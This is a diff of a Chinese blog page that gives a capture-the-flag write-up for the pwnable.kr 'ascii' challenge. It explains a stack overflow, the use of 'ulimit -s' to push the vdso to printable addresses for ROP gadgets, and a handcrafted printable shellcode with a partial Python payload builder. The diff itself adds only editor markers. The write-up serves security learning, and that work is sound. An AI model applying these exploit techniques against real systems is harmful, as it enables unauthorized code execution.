@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -699,10 +699,19 @@
   
 
 
+<!-- blog-edit-start:00e51969c206fa86:b0 -->
+
 <h1 id="pwnablekr-ascii">Pwnable.kr ascii 题解</h1>
+<!-- blog-edit-end:00e51969c206fa86:b0 -->
+
 <div class="file-actions" data-image-edit-revision="453fae7f75cf9fdb01cfe74cfb07d3eb90f128c75ef146d4278260cc32272cae" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote%5C40.ascii.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\40.ascii.md">复制路径</span></div>
 
+<!-- blog-edit-start:00e51969c206fa86:b1 -->
+
 <h2 id="_1">源码分析</h2>
+<!-- blog-edit-end:00e51969c206fa86:b1 -->
+<!-- blog-edit-start:00e51969c206fa86:b2 -->
+
 <p>很简单，没有太多花里胡哨，就是考编码知识。<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span><span class="p">{</span>
@@ -716,19 +725,60 @@
 </span><span id="__span-0-10"><span class="linenos" data-linenos="10 "></span><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dest</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x80000000</span><span class="p">);</span>
 </span><span id="__span-0-11"><span class="linenos" data-linenos="11 "></span><span class="p">}</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:00e51969c206fa86:b2 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b3 -->
+
 <h2 id="_2">解题步骤</h2>
+<!-- blog-edit-end:00e51969c206fa86:b3 -->
+<!-- blog-edit-start:00e51969c206fa86:b4 -->
+
 <p>这道题我构造结果是这样的: { shellcode | padding | fake ebp | jmp 0x80000000(shellcode) }. 很显然就是第一个和最后一个是值得写的，下面来进行讲解。</p>
+<!-- blog-edit-end:00e51969c206fa86:b4 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b5 -->
+
 <h3 id="jmp-0x80000000shellcode">JMP 0x80000000(shellcode)</h3>
+<!-- blog-edit-end:00e51969c206fa86:b5 -->
+<!-- blog-edit-start:00e51969c206fa86:b6 -->
+
 <p>首先讲如何完成 <code>jmp 0x80000000</code> 这条指令，这种的方法是: <strong>求助栈中内容</strong>，暂时没想到有什么更好的方法，有的话欢迎评论。</p>
+<!-- blog-edit-end:00e51969c206fa86:b6 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b7 -->
+
 <p>这道题观察发现溢出的时候栈里面是这样的: { old ebp | return addr | 10 * xxx | 0x80000000 }，使用 ROP 来完成目标。但是程序地址一般是 0x08xxxxxx，很明显这个 0x08 不可打印，导致程序中的 ROP 也是不可打印的。</p>
+<!-- blog-edit-end:00e51969c206fa86:b7 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b8 -->
+
 <p>技巧是借助 vdso 中的 ROP，因为 vdso 的地址是可以用户控制的。对于 <code>ulimit -s xxxx</code> 命令，它的意思是让栈的空间最大可以为 xxx，但是栈空间变大，与此同时 vdso 的地址逐渐降低，所以可以控制 vdso 地址到一个可打印的地址块。</p>
+<!-- blog-edit-end:00e51969c206fa86:b8 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b9 -->
+
 <p>比如我本机中正常情况下某次 vsdo 是 0xf7f22000，如果执行 <code>ulimit -s 2780000</code> 后，就变成了 0x56424000。然后查看 ROP，用了下面的两个，正好偏移加上后都是可打印的，构造如下: { vdso + 0x549 | 3 * xx | vdso + 0x549 | 3 * xx | vdso + 0x54b | xx | 0x80000000(原来栈上就有的) }。<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos="1 "></span>0x00000549 : pop ebp ; pop edx ; pop ecx ; ret
 </span><span id="__span-1-2"><span class="linenos" data-linenos="2 "></span>0x0000054b : pop ecx ; ret
 </span></code></pre></div></p>
+<!-- blog-edit-end:00e51969c206fa86:b9 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b10 -->
+
 <h3 id="printable-shellcode">Printable Shellcode</h3>
+<!-- blog-edit-end:00e51969c206fa86:b10 -->
+<!-- blog-edit-start:00e51969c206fa86:b11 -->
+
 <p>这一块就是如何写出可打印的 shellcode，感觉写完还是比较得意的，甚至觉得这个可以完全作为万能使用了。</p>
+<!-- blog-edit-end:00e51969c206fa86:b11 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b12 -->
+
 <p>首先最难完成的当然是 <code>int 0x80</code> 这条指令，主要用到了 <code>sub [reg + num], al</code> 这个可打印语句。分为两部分，首先我们要先使得一个寄存器指向 0x80000000，然后通过这个寄存器的偏移修改目标地址的内容，这样说很抽象，请看后面步骤。</p>
+<!-- blog-edit-end:00e51969c206fa86:b12 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b13 -->
+
 <p>第一步是让某个寄存器指向 0x80000000，这里选择的是 ebx，具体做法如下。</p>
 <ol>
 <li>一开始先让栈里面存着 0x20303030，并且 <code>al=0x30, ah=0x70</code></li>
@@ -748,6 +798,10 @@
 </span><span id="__span-2-11"><span class="linenos" data-linenos="11 "></span>pop ebx
 </span></code></pre></div></li>
 </ol>
+<!-- blog-edit-end:00e51969c206fa86:b13 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b14 -->
+
 <p>第二步是利用 ebx 进行偏移改变，如下所示。<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos="1 "></span>push 0x70
 </span><span id="__span-3-2"><span class="linenos" data-linenos="2 "></span>pop eax
@@ -755,10 +809,18 @@
 </span><span id="__span-3-4"><span class="linenos" data-linenos="4 "></span>sub BYTE PTR [ebx+0x58], al
 </span><span id="__span-3-5"><span class="linenos" data-linenos="5 "></span>sub BYTE PTR [ebx+0x57], al
 </span></code></pre></div></p>
+<!-- blog-edit-end:00e51969c206fa86:b14 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b15 -->
+
 <ol>
 <li>首先要知道 0x80000000 + 0x57 存着我们事先放好的值 <code>\x3d\x60</code>，我们需要把它变成 <code>\xcd\x80(int 0x80)</code></li>
 <li>所以和刚才那样一样，利用 sub 指令，0x3d-0x70=0x6d，0x60-0x70-0x70=0x80</li>
 </ol>
+<!-- blog-edit-end:00e51969c206fa86:b15 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b16 -->
+
 <p>这个最难的解决了，剩下都比较简单了，直接附上我的代码片段。<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="n">sc</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
 </span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span>
@@ -813,12 +875,22 @@
 </span><span id="__span-4-51"><span class="linenos" data-linenos="51 "></span><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr_01</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
 </span><span id="__span-4-52"><span class="linenos" data-linenos="52 "></span><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret_addr_02</span><span class="p">)</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:00e51969c206fa86:b16 -->
+
+<!-- blog-edit-start:00e51969c206fa86:b17 -->
+
 <h2 id="_3">个人总结</h2>
+<!-- blog-edit-end:00e51969c206fa86:b17 -->
+<!-- blog-edit-start:00e51969c206fa86:b18 -->
+
 <ol>
 <li>如何使用 ascii 实现 JMP 0x80000000 </li>
 <li>如何写出 printable shellcode</li>
 <li>vdso 的初步学习，可以利用 <code>ulimit -s</code> 命令改变它的地址，可以利用它的 ROP</li>
 </ol>
+<!-- blog-edit-end:00e51969c206fa86:b18 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\40.ascii.md" data-text-edit-revision="453fae7f75cf9fdb01cfe74cfb07d3eb90f128c75ef146d4278260cc32272cae" data-text-edit-marker="00e51969c206fa86" data-text-edit-schema="1"></div>
 
 
 
@@ -1050,8 +1122,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
